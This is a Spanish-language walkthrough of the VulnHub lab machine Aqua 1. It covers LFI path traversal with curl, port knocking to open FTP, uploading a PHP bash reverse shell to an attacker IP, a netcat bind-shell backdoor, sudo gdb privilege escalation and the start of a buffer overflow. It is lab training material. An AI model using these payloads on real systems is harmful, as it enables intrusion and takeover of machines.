---
layout: single
title: Aqua 1 - VulnHub
excerpt: "La maquina Aqua 1 de la plataforma de VulnHub es una muy buena maquina si es que nunca has explotado un LFI tendremos que abusar del LFI para poder ver un archivo para hacer Port knocking para abrir el puerto 21 donde vamos a conectarnos al servicio FTP para obtener informacion y subir un archivo .php para ganar acceso al sistema en la escalada de privilegios hay 2 formas de llegar a ser root"
date: 2023-02-25
classes: wide
toc: true
toc_label: "Contenido"
toc_icon: "fire"
header:
  teaser: /assets/images/vh-writeup-acua/logo2.png
  teaser_home_page: true
  icon: /assets/images/vulnhub.webp
categories:
  - VulnHub
tags:  
  - LFI
  - Buffer Overflow
  - Port knocking
---
![](/assets/images/vh-writeup-acua/logo.png)

```bash
❯ whichSystem.py 192.168.1.84

192.168.1.84 (ttl -> 64): Linux
```

## PortScan

Si hacemos un escaneo para ver los puertos que estan abiertos nos muestra estos

```java
❯ nmap -sCV -p80,139,445 192.168.1.84 -oN targeted
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 13:58 CST
Nmap scan report for 192.168.1.84
Host is up (0.00068s latency).

PORT    STATE SERVICE     VERSION
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_http-server-header: Apache/2.4.18 (Ubuntu)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
MAC Address: 00:0C:29:A0:71:86 (VMware)
Service Info: Host: LINUXLITE

Host script results:
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_clock-skew: mean: -2h40m01s, deviation: 4h37m07s, median: -2s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: LINUXLITE, NetBIOS user: <unknown>, NetBIOS MAC: 000000000000 (Xerox)
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: aqua
|   NetBIOS computer name: LINUXLITE\x00
|   Domain name: \x00
|   FQDN: aqua
|_  System time: 2023-02-26T03:59:04+08:00
| smb2-time: 
|   date: 2023-02-25T19:59:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.08 seconds
```

Si hacemos un escaneo sin parametros solo nos muestra otro puerto el `ftp` no esta abierto esta filtrado mas adelante tendremos que hacer `Port Knocking` para abrir el puerto

```bash
❯ nmap 192.168.1.84
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 14:00 CST
Nmap scan report for 192.168.1.84
Host is up (0.0047s latency).
Not shown: 996 closed tcp ports (reset)
PORT    STATE    SERVICE
21/tcp  filtered ftp
80/tcp  open     http
139/tcp open     netbios-ssn
445/tcp open     microsoft-ds
MAC Address: 00:0C:29:A0:71:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.51 seconds
```

Vemos estas rutas interesantes

```bash
❯ nmap --script=http-enum -p80 192.168.1.84 -oN webScan
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 14:02 CST
Nmap scan report for 192.168.1.84
Host is up (0.00064s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /login.php: Possible admin folder
|_  /manual/: Potentially interesting folder
MAC Address: 00:0C:29:A0:71:86 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.23 seconds
```

## Enumeracion

```ruby
❯ whatweb http://192.168.1.84
http://192.168.1.84 [200 OK] Apache[2.4.18], Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][Apache/2.4.18 (Ubuntu)], IP[192.168.1.84], Script[text/javascript]
```

Asi es como se ve la web y nos esta diciendo que`Megumin` a hackeado su computadora ademas dice que perdio su `contraseña` nos pregunta que si podemos ayudarla a hackearlo de vuelta asi que le vamos a decir que si 

![](/assets/images/vh-writeup-acua/Web1.png)

Despues de decirle que si nos da esta repuesta nos esta dando `credenciales` del diario secreto de `megumin` pero no sabe donde esta

![](/assets/images/vh-writeup-acua/Web2.png)

`megumin:watashiwamegumin`

`Nmap` nos habia descubierto rutas asi que vamos a ver que es lo que hay si revisamos la ruta de `manual` nos lleva aqui

![](/assets/images/vh-writeup-acua/Web3.png)

Ahora vamos a revisar `login.php`

Y nos lleva aqui lo que podemos hacer es comprobar las credenciales que nos dieron para ver si se utilzan aqui

![](/assets/images/vh-writeup-acua/Web4.png)

Y si las credenciales son correctas despues de eso nos muestra una web llena de gatos y nos dice Bienvenidos a su mentira secreta

![](/assets/images/vh-writeup-acua/Web5.png)

Si vemos la `url` esta apuntando a un recurso `=index.php` podemos ver si esto es vulnerable a `LFI` 

Ahora que sabemos que si haremos todo con `curl` para mas comodo 

![](/assets/images/vh-writeup-acua/Web6.png)

Algo interesante a saber es que si haces una peticion con  `curl` de primeras no va a funcionar por que necesitas la `cookie`

![](/assets/images/vh-writeup-acua/Web7.png)

```bash
❯ curl -s "http://192.168.1.84/home.php?showcase=../../../../etc/passwd" -b PHPSESSID=lajkn6k3qshls8g5qepomldgo7 | grep sh
root:x:0:0:root:/root:/bin/bash
aqua:x:1000:1000:aqua,,,:/home/aqua:/bin/bash
megumin:x:1001:1001:,,,:/var/www/html/deployment:/bin/bash
```

Y bueno tenemos 3 usuarios `root:aqua:megumin` que tienen una `bash` antes de seguir enumerando gracias al `LFI` podemos hacer `Fuzzing` para si encontramos algo util `.php`

Pero solo encontramos esto lo unico importante fue el login

```python
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/raft-medium-directories.txt -u http://192.168.1.84/FUZZ.php
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://192.168.1.84/FUZZ.php
Total requests: 30000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                        
=====================================================================

000000039:   200        50 L     173 W      1801 Ch     "login"                                                        
000000130:   302        17 L     17 W       158 Ch      "home"                                                         
000000245:   200        27 L     92 W       927 Ch      "index"                                                        
000000882:   200        30 L     93 W       935 Ch      "welcome"                      
```

Vemos mas cosas

```bash
❯ curl -s "http://192.168.1.84/home.php?showcase=../../../../proc/net/tcp" -b PHPSESSID=lajkn6k3qshls8g5qepomldgo7 | tail -n 5
  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt   uid  timeout inode                                                     
   0: 00000000:01BD 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17530 1 00000000 100 0 0 10 0                             
   1: 0100007F:0CEA 00000000:0000 0A 00000000:00000000 00:00000000 00000000   120        0 17347 1 00000000 100 0 0 10 0                             
   2: 00000000:008B 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 17531 1 00000000 100 0 0 10 0                             
   3: 0100007F:0277 00000000:0000 0A 00000000:00000000 00:00000000 00000000     0        0 15390 1 00000000 100 0 0 10 0  
```

Para verlos mejor estos son

```bash
❯ curl -s "http://192.168.1.84/home.php?showcase=../../../../proc/net/tcp" -b PHPSESSID=lajkn6k3qshls8g5qepomldgo7 | tail -n 5 | awk '{print $2}' | grep -v 'local' | sed 's/.*://'
01BD
0CEA
008B
0277
```

Despues de convertirlos estos son los puertos

```bash
❯ for port in $(curl -s "http://192.168.1.84/home.php?showcase=../../../../proc/net/tcp" -b PHPSESSID=lajkn6k3qshls8g5qepomldgo7 | tail -n 5 | awk '{print $2}' | grep -v 'local' | sed 's/.*://'); do echo "ibase=16; $port" | bc; done

445
3306
139
631
```

Estos son los puertos

```
445 -> SMB
3306 -> MySQL
139 -> NetBios
631 -> CUPS
```

 De primeras no tenemos credenciales para conectarnos a `mysql` pero hay que recordar que habia un puerto filtrado que era el del `ftp`

 ```bash
❯ curl -s "http://192.168.1.84/home.php?showcase=../../../../etc/knockd.conf" -b PHPSESSID=lajkn6k3qshls8g5qepomldgo7 | tail -n 8
[options]
UseSysLog
Interface=ens33
[FTP]
sequence = 1234:tcp,5678:tcp,9012:tcp
seq_timeout = 15
tcpflags = syn
command = iptables -I INPUT 1 -s %IP% -p tcp -m tcp --dport 21 -j ACCEPT
```

Podemos usar la herramienta `knock` para golpear los puertos y abrirlos

```bash
 ❯ knock 192.168.1.84 -v 1234 5678 9012
hitting tcp 192.168.1.84:1234
hitting tcp 192.168.1.84:5678
hitting tcp 192.168.1.84:9012
```

Ahora si revisamos si el puerto por `ftp` esta abierto vemos que si

```bash
❯ nmap 192.168.1.84 -p 21
Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-25 16:45 CST
Nmap scan report for 192.168.1.84
Host is up (0.00053s latency).

PORT   STATE SERVICE
21/tcp open  ftp
MAC Address: 00:0C:29:A0:71:86 (VMware)
```

Vamos a conectarnos reutilizando las credenciales que teniamos 

```bash
❯ ftp 192.168.1.84
Connected to 192.168.1.84.
220 (vsFTPd 3.0.3)
Name (192.168.1.84:root): megumin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 33       33            107 Jan 16  2020 hello.php
-rw-r--r--    1 33       33             93 Jan 16  2020 notes
drwxr-xrwx    2 1001     1001         4096 Jan 14  2020 production
226 Directory send OK.
ftp> 
```

Vamos a traernos el archivo que dice `notes`

```bash
❯ catnp notes
───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: notes
───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Please do not delete the /var/www/html/deployment/production/ directory - Megumin the hacker
───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Nos estan dando una ruta vamos a subir un archivo `.php` para enviarnos una reverse shell

```php
❯ /bin/cat shell.php
<?php
    system("bash -c 'bash -i >& /dev/tcp/192.168.1.77/443 0>&1'")
?>
```

Ahora lo subimos y si todo va bien deberia de funcionar

```bash
❯ ftp 192.168.1.84
Connected to 192.168.1.84.
220 (vsFTPd 3.0.3)
Name (192.168.1.84:root): megumin
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> cd production
250 Directory successfully changed.
ftp> put shell.php
local: shell.php remote: shell.php
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
75 bytes sent in 0.00 secs (1.2123 MB/s)
ftp> 
```

```bash
❯ netcat -lvnp 443
listening on [any] 443 ...
```

```bash
❯ curl "192.168.1.84/home.php?showcase=../deployment/production/shell.php" -b PHPSESSID=d8sqe0re1if74iduiru30raju3
```

Y funciona

```bash
❯ netcat -lvnp 443
listening on [any] 443 ...
connect to [192.168.1.77] from (UNKNOWN) [192.168.1.84] 45908
bash: cannot set terminal process group (1039): Inappropriate ioctl for device
bash: no job control in this shell
www-data@aqua:/var/www/html$ whoami
whoami
www-data
www-data@aqua:/var/www/html$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data),1001(megumin)
www-data@aqua:/var/www/html$ 
```

Para que tengas una mejor shell

```
script /dev/null -c bash
CTRL+Z
stty raw -echo; fg
reset xterm
ENTER
```

## User flag

```bash
www-data@aqua:/home/aqua/Desktop$ cat user.txt 

Congratulations!


                         ((/                                                   
                     ,(##########((                                            
                   (###############((#(//                                      
                 #####(#/,(###########(###(.                                   
               ,####(#,/,(########((#####(###(/                                
               #####(,##(#(###(#(#/,,,,,(,,#,,,/                               
             ((##(###(#(#(*,/,,(*,,,(#/(,**,,/(/*/                             
           (#####%(##(((*#(,,,(,,,,/((%############.                           
         ###%%##%%(#/,/*,,,/(#(#(#(####################(.                      
     /,*          ((,,((#(###(########(/,,,,*/*,,,,(########(                  
  ,,,,/          (,,,(##########(,,,*((%%%%,%%%%%%%%#(*,,(#######/             
 ***/            ((#(######(,,*(%%,#%%%%%%%%.%%%%%%%%(%#%#(#(((/,,/(((,        
                 ######(,,/#%(%%%#..%/%%%%%%#.#%%(%%%%#%(############(,        
              ,#####(,,(%%%%%%%((*...#(######( (####(#(%%(%#(/.                
            *#####,,(%%%%%%%%(//#  ,, /(/######/*###(#(##(                     
          ,####(,/(%%%%%%%%#(. /(.  .*       /(((//*(#(###/                    
         (###(,(%(%%%%%%####( /   ,(((        *(( ((,#%##((                    
       /###(,(#%#%#%%#,###### .  ((((,/       .,(/(* .#(#(#                    
      (##,*#%#%%##%#(( #######   (*,,*            . .  (#(*                    
    /(,/##########(#(#((##(##.*   ,.             ,***/ (#(                     
  /###((((((/.     #(##(#####. .,...  /.///////((      ((,                     
                     (##(##(#/.       ///////////     #%#                      
                      #(###((#..      (////////(   /#%%((.                     
                      , (###%((%%%%,(   .//(/. /(%%%#(#                        
                        .#%##((%%%/,*%%##%%(/%*/%%%%(/           (,(.*         
                        .(#%((%/,(,(*/,    ./#%(*##%#(           #(((/(****/   


Now, there are two ways to get root. I'll let you choose. If you managed to get both, that's gonna be AWESOME to hear! Good luck!

404CDD7BC109C432F8CC2443B45BCFE95980F5107215C645236E577929AC3E52
www-data@aqua:/home/aqua/Desktop$ 
```

Nos estan diciendo que hay 2 formas de ser root asi que bueno vamos a empezar a enumerar

```bash
www-data@aqua:/$ find \-perm -4000 2>/dev/null
./bin/ping6
./bin/fusermount
./bin/mount
./bin/su
./bin/umount
./bin/ping
./usr/bin/gpasswd
./usr/bin/chfn
./usr/bin/pkexec
./usr/bin/passwd
./usr/bin/chsh
./usr/bin/newgrp
./usr/bin/sudo
./usr/lib/openssh/ssh-keysign
./usr/lib/eject/dmcrypt-get-device
./usr/lib/dbus-1.0/dbus-daemon-launch-helper
./usr/lib/policykit-1/polkit-agent-helper-1
```

No vamos a explotar el `pkexec` bueno podemos reutlizar credenciales

```bash
www-data@aqua:/$ su megumin
Password: 
megumin@aqua:/$ whoami
megumin
megumin@aqua:/$ 
```

## Root 1

```bash
megumin@aqua:/$ sudo -l
Matching Defaults entries for megumin on aqua:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User megumin may run the following commands on aqua:
    (ALL) NOPASSWD: /home/aqua/Desktop/backdoor
megumin@aqua:/$ 
```

Esta ejecutando una reverse shell al puerto `1337`

```bash
megumin@aqua:/$ cat /home/aqua/Desktop/backdoor 
#!/bin/bash

echo "[+] Backdoor opened! Hehehe..."

runuser -l aqua -c 'nc -lvnp 1337 -e /bin/sh' &>/dev/null
megumin@aqua:/$ 

```

```bash
megumin@aqua:/$ sudo /home/aqua/Desktop/backdoor
[+] Backdoor opened! Hehehe...
```

Somos `aqua` 

```bash
❯ netcat 192.168.1.84 1337
whoami
aqua
script /dev/null -c bash
Script started, file is /dev/null
aqua@aqua:~$ whoami
whoami
aqua
aqua@aqua:~$ id
id
uid=1000(aqua) gid=1000(aqua) groups=1000(aqua),4(adm),24(cdrom),30(dip),46(plugdev),114(lpadmin),115(sambashare)
aqua@aqua:~$ 
```

Bueno para ser `root` la forma mas facil es esta

```bash
aqua@aqua:~$ sudo gdb -q
sudo gdb -q
(gdb) !bash
!bash
root@aqua:~# id
id
uid=0(root) gid=0(root) groups=0(root)
root@aqua:~# whoami
whoami
root
root@aqua:~# 
```

Pero bueno tambien puedes explotar un binario que es vulnerable a  `Buffer overflow`

## Root 2

Este es el binario y nos pide un nombre

```bash
aqua@aqua:~$ sudo /root/quotes
sudo /root/quotes
/root/quotes [Your name here] 
aqua@aqua:~$ 
```

Nos dice esto

```bash
aqua@aqua:~$ sudo /root/quotes miguel7
sudo /root/quotes miguel7
Hi miguel7,
A tiger doesn't lose sleep over the opinion of sheep.
aqua@aqua:~$ 
```

Ahora vamos a ver si el programa se llega a corromper

```bash
aqua@aqua:~$ sudo /root/quotes $(python3 -c "print('A'*50)")
sudo /root/quotes $(python3 -c "print('A'*50)")
Hi AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA,
Segmentation fault
aqua@aqua:~$  
```

Vamos a usar `gdb` con `peda` <https://github.com/longld/peda>

Vamos a ver cuantos caracteres necesitamos para antes de sobreescribir los registros

```bash
[----------------------------------registers-----------------------------------]
EAX: 0x37 ('7')
EBX: 0xbffffbc0 --> 0x2 
ECX: 0x7fffffca 
EDX: 0xb7fbc870 --> 0x0 
ESI: 0x8048ed0 ("Hi %s,\n")
EDI: 0xbffffb90 --> 0x2 
EBP: 0x41304141 ('AA0A')
ESP: 0xbffff3b0 --> 0xbf004162 
EIP: 0x41414641 ('AFAA')
EFLAGS: 0x10282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414641
[------------------------------------stack-------------------------------------]
0000| 0xbffff3b0 --> 0xbf004162 
0004| 0xbffff3b4 --> 0x0 
0008| 0xbffff3b8 --> 0x0 
0012| 0xbffff3bc --> 0x0 
0016| 0xbffff3c0 ("Impossible is for the unwilling.")
0020| 0xbffff3c4 ("ssible is for the unwilling.")
0024| 0xbffff3c8 ("le is for the unwilling.")
0028| 0xbffff3cc ("s for the unwilling.")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414641 in ?? ()
gdb-peda$ 
```

No se por que no puedo verlo que pero hice esto antes de que me saliera eso

```
pattern_create 50 pattern
```

```
run $(cat pattern)
```

Vamos a pasarle `EIP` y necesitamos 44 antes de sobreescribir

```bash
gdb-peda$ pattern offset 0x41414641
1094796865 found at offset: 44
gdb-peda$ 
```

Vamos a ver las funciones

```bash
Non-debugging symbols:
0x08048364  _init
0x080483a0  printf@plt
0x080483b0  time@plt
0x080483c0  strcpy@plt
0x080483d0  puts@plt
0x080483e0  exit@plt
0x080483f0  srand@plt
0x08048400  __libc_start_main@plt
0x08048410  rand@plt
0x08048430  _start
0x08048460  __x86.get_pc_thunk.bx
0x08048470  deregister_tm_clones
0x080484a0  register_tm_clones
0x080484e0  __do_global_dtors_aux
0x08048500  frame_dummy
0x0804852b  main
0x080485fc  getname
0x08048630  __libc_csu_init
0x08048690  __libc_csu_fini
0x08048694  _fini
0xb7ff48ed  __x86.get_pc_thunk.si
0xb7ff48f1  __x86.get_pc_thunk.di
0xb7ff48f5  __x86.get_pc_thunk.bp
0xb7ff48f9  __x86.get_pc_thunk.cx
0xb7fdb810  __libc_memalign@plt
0xb7fdb820  malloc@plt
0xb7fdb830  calloc@plt
0xb7fdb840  realloc@plt
0xb7fda730  __vdso_clock_gettime
0xb7fdaa00  __vdso_gettimeofday
0xb7fdab80  __vdso_time
0xb7fdabb4  __kernel_sigreturn
0xb7fdabc0  __kernel_rt_sigreturn
0xb7fdabc8  __kernel_vsyscall
0xb7e206b0  _Unwind_Find_FDE@plt
0xb7e206c0  realloc@plt
0xb7e206e0  memalign@plt
0xb7e20710  _dl_find_dso_for_object@plt
0xb7e20720  calloc@plt
0xb7e20730  ___tls_get_addr@plt
gdb-peda$ 
```

Recordar `GatoGamer1155` explica y tiene mejor dominio en esto del `Buffer Overflow` pueden ver su `writeup` para entender mejor esta parte igual gracias por su ayuda <https://gatogamer1155.github.io> 

Yo no eh explotada mucho `Buffer overflow` solo en algunos casos pero si complete la maquina de la primer forma xd

En caso de querer explotar el `Buffer overflow` pueden ir al `writeup` de `GatoGamer1155`

```bash
root@aqua:/root# cat root.txt 

Congratulations on getting the root shell!

Try to get root on two ways! [If you have more, well, you're the master then.. :> ]

Need some hint on the harder way of getting root? Decode this : RG8gbm90IHVzZSAvdXNyL3NoYXJlL2dkYiBpbiB0aGUgc3Vkb2VycyBmaWxl 

Or if you don't want any hint, simply don't decode it. XD


You like the box? or not? Hit me up on Twitter @yunaranyancat ;)



                                               ..               ((((##,                            
                                        ,,..*/(/(##%%%%#/*.     ##(##.                             
                                    .,..**.,*////((########%%%( ,%#(                               
                                  ,..,(*(((///((((((((#######%%%%##/,,..                           
                                ,.,(#(//////(((((####((####%%%%###%%#####(///*                     
                              ..*(#/***////((##(///(#(//(#%((((((%%%%%%#######*/,                  
                            ..,##*,,***//((////(#((((((%#**/(((%#((#(#%%%########**.               
                           ,./#/,,,,**//***//(((((((#%%(((((##(*/((#(((%#%#########**,             
                          .,(#*,,,,*..,**/////((##(%#(((((#((((((((#(((#%##%##########*,           
                         ,.(#*.,,,....,*/**///////#(((((((((((((((((((((#%##%##########(*.         
                       ,,,*#*,,..,,,,,*,***,,***/(//(//(((((((((((#(((((##%###############(        
                     ,.,,,(*,,.,,,,,*,*,,,***,,#///*,.,//(((((((((((((((#(###(#%###########(       
                   .. .*,*#*,,,,,,*,*,*,*,,*(#(//*,...*///////(((*/(((((#((###((#%##########%,     
                  .  ,#,,(%******/*******,*##*//*,**,,,*////////,*//((((#(((###(##%##########%*    
                 ,  *%/**((****#(*******/##,*(*/********,.,,,*/..,*/////((/*##(####%##########%.   
                ,  /##*/*(#///#(////**/##/,*////*********, .*,..,,,*////(//*(#(#####%###########.  
               . .*#/#/#//#(/#(///(####(***///#/*********,,*,******///*,,,,,,#((######%##########. 
              , .*#//((##(((#(/////##%%////(/(#/*************/*******////,...#((((#(#(###########( 
             ..,*(/**/(((####(///(#**//(/////##(////***(#**%(*/************,./(((((#(((%#########%*
             ,,*((/*/(#/((#((////****/(///(/(###(((//##//(#(//*/////********,*(((((##(((#%#########
             */(#///(#//(####&@/*,,*/((//(#/(###((#%%#(****///(//(///////****,#//((((#(((#%#######%
            ./(%#(/(#(//(#(**#&@*,*/((///((/(#((###/,,//**/(/#///(///////****,#(///(((#(((#########
            /(#%#(#%%(//*/.,&&&&@/**///*(#///#(,,,,,,,.../((#((((((((((((/***,##//////(((((########
           *(##%##%%%(/*,*  .%%&&*,*//*/##/*//,,,,.     .*#(((((#(((((((#////*%##//////#(((###(((((
          *#**(%#%%(((/. . #//%&/*.****(,.****.,..     .,*/(//((#(((((((#(////%##(/////(#(((###((((
        .,/. ,(%%(#(/#/.   (*..* . ****,  ,***,,,*...  ..*,///(##((((((##((//(%###//////(((((%##(((
      .*,.    *%(//((, .   ,/*,    .***.    .**,(%%&@@#....*///#(((((((##(((/#%%##(//((((#((((###(#
    ,*.        *(//&*  ..           .,*        .../&&&&&&( **//((((((####((((%%%###(((((((#(((#####
              *(%&%(       .                     ./&&&&&&&&**//((((((#(#((((%%%%###(((((((((/((###(
              (/&&%/                            ##/#&%&&&&&&/(((((((##(#(((#%%%%###((((((((((/(%##(
             ,(&%%%#                           .%*,/(&&%&&&%///((((#(((#((/&%%%%#(##(((/(((((//##((
   ....      *#%%%%%,                          .#*...,/%&((##*/(((#(((#((((&%%%%#((#((((((/(((/(#(/
  .,. ...    .#%%%%%(                             ,//*...   ,,((##((((#(((&&%%%%#((##(((((((((/(#/*
 .. .  ...    *%%%%&%,     *(*,                             ,*#((((((##(/(, /%%%##((#(((((((((/(#/*
  .  . . ..  .#/#%%%%#     ,*,..,,.                     ..,//(((((((#(#((/*.#%%%(#((((((((((/(((#/*
  .  .  . .  *(///%%%%/     ,......,.           ..,,,,,**/////(((###(((((,*,%%%%(((((/((((#//((((/*
  .  .  .  .,/#//#//(##       .......,.              .*****/((##%%#((#((*..(%%%%((#((((#(((//(((/(*
  .     .  ,/((/(#/(#(#*                                .*,#(##%#((((#((*.,&%%%%((#((((((((//(#//((
  .      . .#%#/#//&%(/%,                             ,*/(#(#&%(######((%&&&%%%%(/#((((#(#(((#((//(
  .      .  *%/((/#%/%#                          .*/***#(#&%##(#####(&&%&%%%%%(/(#((((###((/(((((
  .  ..  ,.  *.(((&%%(&%%%%#(//**............,,,,,****((#%%%######(%(&&&%%%%%%(/(#(((((###%#(((##
  .  ..  .,  .*#/%%%%/#&%%%######%.........,,,,,,,,,*(#(##%%######(%(&&&%%%%%%#/(##(/(((%###%((##
  .  ..   ,   *%(/#&&%,&((&%%&%%%%%%*.......,,,,**,,,,((((%##%/(####(%%@@@&%&%%%%/(###((((##%##%%##
 .             %%((/((/&&%(%%%&%%%%%%,.....,*,.,,,,//(#(#%%###//((##(%&@@@@%&%%%%((##%#((((###%###%
               /%%(((//////(##%%&%%%((//*...,,**,,,(####%%###((///***#&@@@&@&&%&%(/##(#(########%#(
               ,%%%#((//((#%%%%%#%#(*.......,,*((((##%#(%%((#(#((((/*#&@@@@@@&&%%#/##((#(#########%
               ,##%#%((%%%%%%%%%&@@(*,..,//#######(%%#%%(##(((#((((#&%%&&@@&%%((##(%#(####(#(((
               *#%%#/,      /%&@&&&@&%(/(///(((#(####%%#(##((((((((%&&%%%%%%##%%#(##(%%#///((((((
              . ...    ./%%%###%####%&%((//##%(#%##%%%##&((###(((((((#%%%%%###%%%(##(%%%%/((((///
           ..       ./#%%#%###%%####&&(#%##%######%%####&((###(((#((((##%#####%%&((#(%%%%#((((//*
         ....      %&&@#(%###%%#########%##%##%%%#####%#/#####((#(((%%%######%&@@#(##%%%#%%((/(/*
       ...        #&&&&(#%##%%%##%&%###%#(#%#%%#######%&*####(#((#(((########&@@@&((#%%%##%%#///(
       ..       .%&%&&%%#%%%#%%%####%(##%%%&%#####%%%%%&/####((#(((((%#####%@@@&%&%/##%%%###%#***
       .       ,%#%&&&%%%&%%%%%####%(#%&&%%%&%%%%%%%%%%&%/####((#(((((#%#%%&&#%%&((#%%%######/*
       .    .*(%%&&&&&&%&&%&&%%####%((#&&&&%%%%@&%%%%%%%&&&(/(###/(##(((((#####%%%%((((##%%%#######
          .(#%%%&&&&&&&%%%&%##%%&(##&&&&&%%%%&@@@@&&&&&&&&(/(###/####(/((((#########%(#(%%%######
.      ,(###%%%&&&&&&&&&%#. ./&%(#%&&&&&&%%%#%&%&&&&&&%%%%%%(####/#%%###########%%%#&%(#(#%%#####
..,..*(####%%%%&&&&&&&&&&*,,(#%##(#%&@&&&&&%%###%&&%&&&%%%%%%%%%%%%(/(####%%%%%&&&&&&&&&%(#((%%####
.,*(((#####%%%%&&&&,,,.,.......(##%&&&&&&&&%#####&&&&%%%%%%%%%%%%%%%(//#%%%%%%%%%%%&&&&&&%((/(/#%##
/(((((#####%%%&&&%,.,**,,,/#(((##%&&&%&&&&&####&&&%%%%%%%%%%%%#%%%%(//(#%%#%%%%%%%#%%&&&&((//(/(%
((((((#####&&&&&%%%&&(..*#@(/((#%&&%%%%%%%%&(((%&%%%%%%%%%%%%%%%%%%%(////(%%%%%%%%%%#%%#%%#((/(//
/(((**,*##&@&&&%%&%%/../(#@,((##&&&%%%%%%%%%(((%%%%%%%%%%%%%#%%%%%%%%(//////(%%%%%%%%(//#%%%((//(
........(##@@&&((.../(/%&/(%#&&&%%%%%%%%%%%&(((#%%%%%%%%%%%%%%%%%%#%%%%(//////////////#&&&%%%##%#
.......,#((*/&(#*,,/#/*&&(%%#&&&%%%%%%%%%%%%%((%%%%%%%%%%%%%%%%%%#%%#%%%%///////////(&&&%%%%%####
......./((///%#%%/,,*#(,/&%%%%&%%%%%%%%%%%%%%/(%%%%%%%%%%%%%%%%%%###%%%%%%%%%#(##%&%%%%%#%%%%%%##
.......(,**#%%%####%%(,*(&&%%%%%&%#%%%%%##%%%%%/(%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%%##%%%%##
....,*...#%%%#((####(,,,/&&%%%%%%%#%%%%%%%%%%%%(%%%%%%%%%%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%#########%%
..,*.,./%&%((((##(((,.,./&&%%%%%%&%%%%%%%%%%%%%#&%%%%%%%%%%%%%%%&%%%%%%%%%%%%%%%%%#%%%%%(((########
%(.*..#&%(((((#(/((. .,.(&&%%%%%%%%%%%%%%%%%%#%%%%%%%%%%%%%%%%#&%%%%%%%%%%#%%%#%%%%%%%%(/#* ,(#####
,,*.*%&(((((((//(((..*.,&%&%%%%%%##(#%%#%%%%%%%%%&%%%%%%%%%%%#%%%%%#%%%%%%%%%%%%%%%%%%#/#**    *(#(
/,,#%%(((((/////((/,*,.%%%&%%#%%#%##%%%%#%%%%%%%%%%&%%%%%%%%%#&%%%%%%%%%%%%%%%%%%%#%%#(##&/        
,,/%#((((/((////((,**,,&%%&%#%%%#%%%%%%%%%%%%%%%%%%%%&&&%%%%%&&%%%%%%%%%%%%%%%%%%%%%##%#%&&        
%/%&%((///////(/(*,*,,(#%%%#%%%%%%%%%%%%%%%%%%%%%%&&&&&&&&&&&&%%%%%%%%%%%%%%%%%%%%%%%%%%%(       
(%%%######((///((,,*,,%#%%%%%%%%%%%%%%%%%%%%%%%%%%&&&&&&&&&&&&%%%%%%%%%%%%%%%%#%%%%%%%%%%%(      
%%%####((/*(#####/**,/&#%%%%%%%%%%%%%%%%%%%%%%%%#&&&&&&&&&&&&&@&%%%%%%%%%%%%%%#%%%%%%%%%%%%/.    
%%#####((((#%%%%%%%%%%&(%%%%%%%%%%%%%%%%%%%%%%%%%&%%&&&&&&&&&&&&&%%%%%%%%%%%%%%&%%%%%%%%%#/    
&%%#(((####%%%%%%&&%%&&%%(%%%%%%%%%%%%%%%%%%%%%%%#%%%%%&&&&&&&&&&&&&%%%%%%%%%%%%&&%%%%%%%%%%%%#/  


CCD758E72A8A8CB5F140BAB26837F363908550F2558ED86D229EC9016FED49B9

root@aqua:/root# 
```
